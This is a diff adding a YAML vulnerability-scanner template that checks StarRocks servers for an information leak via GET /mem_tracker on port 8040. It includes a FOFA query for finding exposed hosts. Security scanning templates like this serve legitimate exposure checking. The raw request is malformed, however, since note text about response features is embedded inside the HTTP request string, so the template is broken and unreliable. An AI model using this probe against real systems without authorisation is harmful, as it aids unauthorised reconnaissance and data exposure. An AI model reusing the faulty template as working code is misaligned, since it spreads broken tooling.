@@ -1,0 +1,34 @@
+id: poc-tlocwipz5o2tknbw
+info:
+  name: StarRocks 信息泄露漏洞8040端口
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tlocwipz5o2tknbw'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tlocwipz5o2tknbw
+    fofa: '"StarRocks" && icon_hash="1498712434"'
+http:
+- raw:
+  - 'GET /mem_tracker HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
